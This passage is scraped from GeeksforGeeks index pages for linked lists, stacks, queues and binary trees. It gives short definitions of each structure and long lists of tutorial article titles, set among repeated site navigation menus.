element to front of a given Linked List Intersection of two Sorted Linked Lists Intersection point of two Linked Lists. QuickSort on Singly Linked List Segregate even and odd nodes in a Linked List Reverse a linked list More >> Circular Linked List : Circular Linked List Introduction and Applications, Circular Linked List Traversal Split a Circular Linked List into two halves Sorted insert for circular linked list Check if a linked list is Circular Linked List Convert a Binary Tree to a Circular Doubly Link List Circular Singly Linked List | Insertion Deletion from a Circular Linked List Circular Queue | Set 2 (Circular Linked List Implementation) Count nodes in Circular linked list Josephus Circle using circular linked list Convert singly linked list into circular linked list Circular Linked List | Set 1 (Introduction and Applications) Circular Linked List | Set 2 (Traversal) Implementation of Deque using circular array Exchange first and last nodes in Circular Linked List More >> Doubly Linked List : Doubly Linked List Introduction and Insertion Delete a node in a Doubly Linked List Reverse a Doubly Linked List The Great Tree-List Recursion Problem. Copy a linked list with next and arbit pointer QuickSort on Doubly Linked List Swap Kth node from beginning with Kth node from end in a Linked List Merge Sort for Doubly Linked List Create a Doubly Linked List from a Ternary Tree Find pairs with given sum in doubly linked list Insert value in sorted way in a sorted doubly linked list Delete a Doubly Linked List node at a given position Count triplets in a sorted doubly linked list whose sum is equal to a given value x Remove duplicates from a sorted doubly linked list Delete all occurrences of a given key in a doubly linked list Remove duplicates from an unsorted doubly linked list Sort the biotonic doubly linked list Sort a k sorted doubly linked list Convert a given Binary Tree to Doubly Linked List | Set Program to find size of Doubly Linked List Sorted insert in a doubly linked list with head and tail pointers Large number arithmetic using doubly linked list Rotate Doubly linked list by N nodes Priority Queue using doubly linked list Reverse a doubly linked list in groups of given size Doubly Circular Linked List | Set 1 (Introduction and Insertion) Doubly Circular Linked List | Set 2 (Deletion) More >> Misc : Skip List | Set 1 (Introduction) Skip List | Set 2 (Insertion) Skip List | Set 3 (Searching and Deletion) Reverse a stack without using extra space in O(n) An interesting method to print reverse of a linked list Linked List representation of Disjoint Set Data Structures Sublist Search (Search a linked list in another list) How to insert elements in C++ STL List ? Unrolled Linked List | Set 1 (Introduction) A Programmer’s approach of looking at Array vs. Linked List How to write C functions that modify head pointer of a Linked List? Given a linked list which is sorted, how will you insert in sorted way Can we reverse a linked list in less than O(n)? Practice questions for Linked List and Recursion Construct a Maximum Sum Linked List out of two Sorted Linked Lists having some Common nodes Given only a pointer to a node to be deleted in a singly linked list, how do you delete it? Why Quick Sort preferred for Arrays and Merge Sort for Linked Lists? Squareroot(n)-th node in a Linked List Find the fractional (or n/k – th) node in linked list Find modular node in a linked list Construct a linked list from 2D matrix Find smallest and largest elements in singly linked list Arrange consonants and vowels nodes in a linked list Partitioning a linked list around a given value and If we don’t care about making the elements of the list “stable” Modify contents of Linked List Quick Links : ‘Practice Problems’ on Linked List ‘Videos’ on Linked List ‘Quizzes’ on Linked List Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Stack Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Stack Data Structure Recent articles on Stack Stack is a linear data structure which follows a particular order in which the operations are performed. The order may be LIFO(Last In First Out) or FILO(First In Last Out). There are many real-life examples of a stack. Consider an example of plates stacked over one another in the canteen. The plate which is at the top is the first one to be removed, i.e. the plate which has been placed at the bottommost position remains in the stack for the longest period of time. So, it can be simply seen to follow LIFO(Last In First Out)/FILO(First In Last Out) order. Topics : Introduction Design and Implementation Standard Problems Operations on Stack Misc Quick Links Introduction : Introduction to Stack Stack in C++ STL Stack Class in Java Stack in Python Stack in C# Design and Implementation : Implement Queue using Stacks Design and Implement Special Stack Data Structure | Added Space Optimized Version Implement two stacks in an array Implement Stack using Queues Design a stack with operations on middle element How to efficiently implement k stacks in a single array? How to create mergable stack? Design a stack that supports getMin() in O(1) time and O(1) extra space Implement a stack using single queue How to implement stack using priority queue or heap? Create a customized data structure which evaluates functions in O(1) Implement Stack and Queue using Deque Standard Problems based on Stack : Infix to Postfix Conversion using Stack Prefix to Infix Conversion Prefix to Postfix Conversion Postfix to Prefix Conversion Postfix to Infix Convert Infix To Prefix Notation The Stock Span Problem Check for balanced parentheses in an expression Next Greater Element Next Greater Frequency Element Number of NGEs to the right Maximum product of indexes of next greater on left and right The Celebrity Problem Expression Evaluation Arithmetic Expression Evalution Evaluation of Postfix Expression Iterative Tower of Hanoi Print next greater number of Q queries Operations on Stack : Reverse a stack using recursion Sort a stack using recursion Sort a stack using a temporary stack Reverse a stack without using extra space in O(n) Delete middle element of a stack Sorting array using Stacks Delete array elements which are smaller than next or become smaller Check if a queue can be sorted into another queue using a stack Reverse individual words Count subarrays where second highest lie before highest Check if an array is stack sortable Misc : Iterative Postorder Traversal | Set 1 (Using Two Stacks) Iterative Postorder Traversal | Set 2 (Using One Stack) Merge Overlapping Intervals Largest Rectangular Area in a Histogram | Set 2 Print ancestors of a given binary tree node without recursion Reverse a string using stack Program for Tower of Hanoi Find maximum depth of nested parenthesis in a string Find maximum of minimum for every window size in a given array Length of the longest valid substring Iterative Depth First Traversal of Graph Minimum number of bracket reversals needed to make an expression balanced Expression contains redundant bracket or not Identify and mark unmatched parenthesis in an expression Check if two expressions with brackets are same Find index of closing bracket for a given opening bracket in an expression Check for balanced parentheses in an expression Balanced expression with replacement Check if a given array can represent Preorder Traversal of Binary Search Tree Form minimum number from given sequence Find if an expression has duplicate parenthesis or not Find maximum difference between nearest left and right smaller elements Find next Smaller of next Greater in an array Find maximum sum possible equal sum of three stacks Count natural numbers whose all permutation are greater than that number Delete consecutive same words in a sequence Decode a string recursively encoded as count followed by substring Bubble sort using two Stacks Pattern Occurrences : Stack Implementation Java Iterative method to find ancestors of a given binary tree Stack Permutations (Check if an array is stack permutation of other) Tracking current Maximum Element in a Stack Check mirror in n-ary tree Reverse a number using stack Reversing the first K elements of a Queue Reversing a Queue Check if stack elements are pairwise consecutive Spaghetti Stack Interleave the first half of the queue with second half Remove brackets from an algebraic string containing + and – operators Growable array based stack Range Queries for Longest Correct Bracket Subsequence Quick Links : ‘Practice Problems’ on Stack ‘Videos’ on Stack ‘Quizzes’ on Stack Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above. My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Queue Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Queue Data Structure Recent articles on Queue A Queue is a linear structure which follows a particular order in which the operations are performed. The order is First In First Out (FIFO). A good example of a queue is any queue of consumers for a resource where the consumer that came first is served first. The difference between stacks and queues is in removing. In a stack we remove the item the most recently added; in a queue, we remove the item the least recently added. Topics : Introduction Implementation Standard Problems Operations on Queue Misc Quick Links Introduction : Queue Applications of Queue Data Structure Priority Queue Applications of Priority Queue Deque Circular Queue Queue Interface In Java Queue In Python Queue In C# Implementation : Implement Queue using Stacks LRU Cache Implementation Implement Stack using Queues Queue | Set 2 (Linked List Implementation) How to efficiently implement k Queues in a single array? Implement a stack using single queue Implementation of Deque using circular array Circular Queue | Set 2 (Circular Linked List Implementation) Implement Stack and Queue using Deque Priority Queue using Linked List Priority Queue using doubly linked list Implementation of Deque using doubly linked list Standard Problems : Check if a queue can be sorted into another queue using a stack Breadth First Traversal or BFS for a Graph Level Order Tree Traversal Reverse a path in BST using queue Construct Complete Binary Tree from its Linked List Representation Program for Page Replacement Algorithms | Set 2 (FIFO) Check whether a given Binary Tree is Complete or not | Set 1 (Iterative Solution) Number of siblings of a given Node in n-ary Tree ZigZag Tree Traversal FIFO (First-In-First-Out) approach in Programming FIFO vs LIFO approach in Programming LIFO (Last-In-First-Out) approach in Programming Operations on Queue : Reversing a Queue Reversing a queue using recursion Reversing the first K elements of a Queue Interleave the first half of the queue with second half Sorting a Queue without extra space Misc : Level order traversal in spiral form Sliding Window Maximum (Maximum of all subarrays of size k) Find the largest multiple of 3 | Set 1 (Using Queue) Find the first circular tour that visits all petrol pumps Smallest multiple of a given number made of digits 0 and 9 only Iterative Method to find Height of Binary Tree Implement PriorityQueue through Comparator in Java An Interesting Method to Generate Binary Numbers from 1 to n Minimum time required to rot all oranges Find maximum level sum in Binary Tree Sum of minimum and maximum elements of all subarrays of size k. Distance of nearest cell having 1 in a binary matrix Level order traversal line by line | Set 2 (Using Two Queues) First negative integer in every window of size k Minimum sum of squares of character counts in a given string after removing k characters Queue based approach for first non-repeating character in a stream Averages of Levels in Binary Tree Stack Permutations (Check if an array is stack permutation of other) Check if all levels of two trees are anagrams or not Check mirror in n-ary tree Check if X can give change to every person in the Queue Quick Links : ‘Practice Problems’ on Queue ‘Videos’ on Queue ‘Quizzes’ on Queue My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Binary Tree Data Structure - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Binary Tree Data Structure A tree whose elements have at most 2 children is called a binary tree. Since each element in a binary tree can have only 2 children, we typically name them the left and right child. A Binary Tree node contains following parts. Data Pointer to left child Pointer to right child Recent Articles on Binary Tree ! Topic : Introduction Traversals Construction & Conversion Checking & Printing Summation Longest Common Ancestor Misc Quick Links Introduction : Binary Tree | Set 1 (Introduction) Binary Tree | Set 2 (Properties) Binary Tree | Set 3 (Types of Binary Tree) Handshaking Lemma and Interesting Tree Properties Enumeration of Binary Trees Insertion in a Binary Tree Deletion in a Binary Tree BFS vs DFS for Binary Tree Binary Tree (Array implementation) AVL with duplicate keys Applications of tree data structure Applications of Minimum Spanning Tree Problem Continuous Tree Foldable Binary Trees Expression Tree Evaluation of Expression Tree Symmetric Tree (Mirror Image of itself) Traversals : Tree Traversals Inorder Tree Traversal without Recursion Inorder Tree Traversal without recursion and without stack! Print Postorder traversal from given Inorder and Preorder traversals Find postorder traversal of BST from preorder traversal Find all possible binary trees with given Inorder Traversal Replace each node in binary tree with the sum of its inorder predecessor and successor Populate Inorder Successor for all nodes Inorder Successor of a node in Binary Tree Find n-th node of inorder traversal Find n-th node in Postorder traversal of a Binary Tree Level Order Tree Traversal Level order traversal in spiral form Level order traversal line by line Level order traversal with direction change after every two levels Reverse Level Order Traversal Reverse tree path Perfect Binary Tree Specific Level Order Traversal Perfect Binary Tree Specific Level Order Traversal | Set 2 Reverse alternate levels of a perfect binary tree Morris traversal for Preorder Iterative Preorder Traversal Iterative Postorder Traversal | Set 1 (Using Two Stacks) Iterative Postorder Traversal | Set 2 (Using One Stack) Postorder traversal of Binary Tree without recursion and without stack Diagonal Traversal of Binary Tree Iterative diagonal traversal of binary tree Boundary Traversal of binary tree Density of Binary Tree in One Traversal Calculate depth of a full Binary tree from Preorder Number of Binary Trees for given Preorder Sequence length Modify a binary tree to get Preorder traversal using right pointers only More >> Construction & Conversion : Construct Tree from given Inorder and Preorder traversals Construct a tree from Inorder and Level order traversals Construct Complete Binary Tree from its Linked List Representation Construct a complete binary tree from given array in level order fashion Construct Full Binary Tree from given preorder and postorder traversals Construct Full Binary Tree using its Preorder traversal and Preorder traversal of its mirror tree Construct a special tree from given preorder traversal Construct tree from ancestor matrix Construct Ancestor Matrix from a Given Binary Tree Construct Special Binary Tree from given Inorder traversal Construct Binary Tree from given Parent Array representation Construct a Binary Tree from Postorder and Inorder Create a Doubly Linked List from a Ternary Tree Creating a tree with Left-Child Right-Sibling Representation Prufer Code to Tree Creation If you are given two traversal sequences, can you construct the binary tree? Construct the full k-ary tree from its preorder traversal Construct Binary Tree from String with bracket representation Linked complete binary tree & its creation Convert a given Binary Tree to Doubly Linked List | Set 1 Convert a given Binary Tree to Doubly Linked List | Set 2 Convert a given Binary Tree to Doubly Linked List | Set 3 Convert a given Binary Tree to Doubly Linked List | Set 4 Convert an arbitrary Binary Tree to a tree that holds Children Sum Property Convert left-right representation of a binary tree to down-right Convert a given tree to its Sum Tree Change a Binary Tree so that every node stores sum of all nodes in left subtree Write an Efficient Function to Convert a Binary Tree into its Mirror Tree Convert a Binary Tree into Doubly Linked List in spiral fashion Convert a Binary Tree to a Circular Doubly Link List Convert a tree to forest of even nodes Convert a given Binary tree to a tree that holds Logical AND property Convert Ternary Expression to a Binary Tree Flip Binary Tree Minimum swap required to convert binary tree to binary search tree Checking & Printing : Check for Children Sum Property in a Binary Tree Check if a given Binary Tree is SumTree Check sum of Covered and Uncovered nodes of Binary Tree Check if two nodes are cousins in a Binary Tree Check if all leaves are at same level Check if removing an edge can divide a Binary Tree in two halves Check if given Preorder, Inorder and Postorder traversals are of same tree Given level order traversal of a Binary Tree, check if the Tree is a Min-Heap Check if leaf traversal of two Binary Trees is same? Check if a given Binary Tree is SumTree Check whether a given binary tree is perfect or not Check whether a binary tree is a full binary tree or not Check whether a binary tree is a full binary tree or not | Iterative Approach Check whether a given Binary Tree is Complete or not | Set 1 (Iterative Solution) Check if a given Binary Tree is height balanced like a Red-Black Tree Check if a binary tree is subtree of another binary tree | Set 2 Check if a Binary Tree (not BST) has duplicate values Check if a Binary Tree contains duplicate subtrees of size 2 or more Check if a given graph is tree or not Check if two trees are Mirror Iterative method to check if two trees are mirror of each other Write Code to Determine if Two Trees are Identical Iterative function to check if two trees are identical Check for Symmetric Binary Tree (Iterative Approach) Check if there is a root to leaf path with given sequence Print middle level of perfect binary tree without finding height Print cousins of a given node in Binary Tree Given a binary tree, print out all of its root-to-leaf paths one per line Print the longest leaf to leaf path in a Binary tree. Print path from root to a given node in a binary tree Print root to leaf paths without using recursion Print all root to leaf paths with there relative positions Print the nodes at odd levels of a tree Print all full nodes in a Binary Tree More >> Summation : Sum of all nodes in a binary tree Sum of all the parent nodes having child node x Find sum of all left leaves in a given Binary Tree Find sum of all right leaves in a given Binary Tree Find sum of all nodes of the given perfect binary tree Diagonal Sum of a Binary Tree Find if there is a pair in root to a leaf path with sum equals to root’s data Sum of nodes on the longest path from root to leaf node Remove all nodes which don’t lie in any path with sum>= k Find the maximum path sum between two leaves of a binary tree Find the maximum sum leaf to root path in a Binary Tree Maximum sum of nodes in Binary tree such that no two are adjacent Maximum sum from a tree with adjacent levels not allowed Find largest subtree sum in a tree Print all k-sum paths in a binary tree Sum of heights of all individual nodes in a binary tree Subtree with given sum in a Binary Tree Count subtress that sum up to a given value x Sum of nodes at maximum depth of a Binary Tree Difference between sums of odd level and even level nodes of a Binary Tree Find maximum level sum in Binary Tree Maximum spiral sum in Binary Tree Sum of nodes at k-th level in a tree represented as string Sum of all leaf nodes of binary tree Sum of leaf nodes at minimum level Root to leaf path sum equal to a given number Sum of all the numbers that are formed from root to leaf paths Merge Two Binary Trees by doing Node Sum (Recursive and Iterative) Vertical Sum in a given Binary Tree | Set 1 Vertical Sum in Binary Tree Find root of the tree where children id sum for every node is given Replace each node in binary tree with the sum of its inorder predecessor and successor Find largest subtree sum in a tree Longest Common Ancestor : Lowest Common Ancestor in a Binary Tree | Set 1 Lowest Common Ancestor in a Binary Tree | Set 2 (Using Parent Pointer) Lowest Common Ancestor in a Binary Tree | Set 3 Find distance between two nodes of a Binary Tree Print common nodes on path from root (or common ancestors) 